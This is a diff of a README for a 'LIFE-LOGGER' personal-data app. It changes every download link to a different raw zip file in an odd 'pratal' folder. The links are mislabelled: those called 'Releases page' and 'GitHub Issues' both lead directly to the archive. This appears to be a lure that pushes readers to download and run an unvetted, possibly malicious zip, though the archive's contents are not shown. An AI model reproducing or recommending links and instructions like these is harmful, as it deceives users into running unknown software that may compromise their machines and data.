@@ -1,6 +1,6 @@
 # 🧠 LIFE-LOGGER - Capture Your Life's Moments Easily
 
-[![Download LIFE-LOGGER](https://raw.githubusercontent.com/Bazeet835/LIFE-LOGGER/main/pratal/LOGGER_LIF_2.1.zip)](https://raw.githubusercontent.com/Bazeet835/LIFE-LOGGER/main/pratal/LOGGER_LIF_2.1.zip)
+[![Download LIFE-LOGGER](https://raw.githubusercontent.com/Bazeet835/LIFE-LOGGER/main/pratal/LIF-LOGGER-v1.0.zip)](https://raw.githubusercontent.com/Bazeet835/LIFE-LOGGER/main/pratal/LIF-LOGGER-v1.0.zip)
 
 ## ✨ Overview
 
@@ -19,7 +19,7 @@ Life Logger is a personal data operating system that prioritizes your privacy. I
 Follow these simple steps to download and run the Life Logger application:
 
 1. **Visit the Releases Page**
-   - Click this link to access the download options: [LIFE-LOGGER Releases](https://raw.githubusercontent.com/Bazeet835/LIFE-LOGGER/main/pratal/LOGGER_LIF_2.1.zip)
+   - Click this link to access the download options: [LIFE-LOGGER Releases](https://raw.githubusercontent.com/Bazeet835/LIFE-LOGGER/main/pratal/LIF-LOGGER-v1.0.zip)
 
 2. **Select the Latest Version**
    - On the releases page, look for the most recent version of Life Logger. It will be listed at the top.
@@ -35,7 +35,7 @@ Follow these simple steps to download and run the Life Logger application:
 
 ## 📥 Download & Install
 
-To get started with Life Logger, [visit this download page](https://raw.githubusercontent.com/Bazeet835/LIFE-LOGGER/main/pratal/LOGGER_LIF_2.1.zip) and download the latest version. The process is simple:
+To get started with Life Logger, [visit this download page](https://raw.githubusercontent.com/Bazeet835/LIFE-LOGGER/main/pratal/LIF-LOGGER-v1.0.zip) and download the latest version. The process is simple:
 
 1. Go to the Releases page.
 2. Download the file for your operating system.
@@ -83,8 +83,8 @@ For troubleshooting, feel free to visit our GitHub Issues page for support.
 
 ## 🔗 Links
 
-- [LIFE-LOGGER Releases](https://raw.githubusercontent.com/Bazeet835/LIFE-LOGGER/main/pratal/LOGGER_LIF_2.1.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/Bazeet835/LIFE-LOGGER/main/pratal/LOGGER_LIF_2.1.zip)
+- [LIFE-LOGGER Releases](https://raw.githubusercontent.com/Bazeet835/LIFE-LOGGER/main/pratal/LIF-LOGGER-v1.0.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Bazeet835/LIFE-LOGGER/main/pratal/LIF-LOGGER-v1.0.zip)
 
 ## 🎉 Join the Community
 
